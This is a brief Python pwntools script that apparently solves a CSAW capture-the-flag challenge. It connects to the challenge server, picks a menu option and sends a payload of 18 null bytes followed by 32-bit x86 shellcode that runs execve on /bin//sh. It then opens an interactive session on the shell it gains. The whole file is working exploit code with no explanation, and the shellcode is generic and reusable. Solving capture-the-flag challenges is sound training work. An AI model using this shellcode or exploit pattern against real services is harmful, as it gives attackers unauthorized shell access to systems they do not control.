from pwn import *


io = remote("pwn.red.csaw.io", 5009)

print(io.recv())

io.sendline("3")

print(io.recv())

io.sendline("\x00" * 18 +  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")

io.interactive()

